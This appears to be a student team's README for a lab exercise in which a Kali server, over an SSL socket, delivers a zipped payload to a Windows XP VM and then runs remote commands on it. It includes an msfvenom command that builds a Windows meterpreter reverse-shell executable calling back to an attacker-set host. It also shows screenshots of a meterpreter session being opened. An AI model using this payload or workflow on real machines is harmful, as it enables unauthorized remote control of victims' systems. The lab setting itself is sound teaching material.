# # MTIC\_Python\_Remote

This is an optional exercise for creating a secure socket communication and then a reverse_shell.

## Team members

- Barrientos Pablo
- Merchán Borja (_Jaretz_)
- Muñoz Laura
- Peñate María

## Scenario and Considerations
### Attacker
This machine will be a Kali Linux VM image.
It will represent our Server, in which we have generated an auto signed certificate and a its self key for a rely connection using SSL socket.

Once we have the files ready, we need to create the 'exploit' to be sent  thru the secure socket.

    msfvemon -p windows/meterpreter/reverse_tcp LHOST=x LPORT=y -f > shellkali.exe
We have to take into account our network settings so you have to set LHOST and LPORT with your needs.

Moreover, a `requirements.txt` file is provided for covering all the library dependencies. 

    pip install -r requirements.txt

Now we have ready our configuration.


### Victim
This machine will be a Windows XP VM image, which will connect to the secure socket and it will receive a .zip with the exploit.
In this machine will have both `client_ssl.py` and `key`

## Process
- The server initializes the connection.
- The client connects to the server.
- The server sends .zip file (exploit)
- The server can execute remotely as many commands as it wants
 	> NOTE: Every command will be typed between ' ' (e.g. 'dir')
 
![pic_00](https://imgur.com/1wmQQ1W.png)

## POC
![pic_01](https://i.imgur.com/cAsGClf.png)

In this figure we can see that the server is initialized and it can execute the commands. 

![pic_02](https://i.imgur.com/jaU1gDr.png)
Now is the victim who receives all the commands and then it executes them.

![pic_03](https://i.imgur.com/kvHVSaF.png)
![pic_04](https://i.imgur.com/ipU36ao.png)
Finally we can see how a meterpreter session is opened.
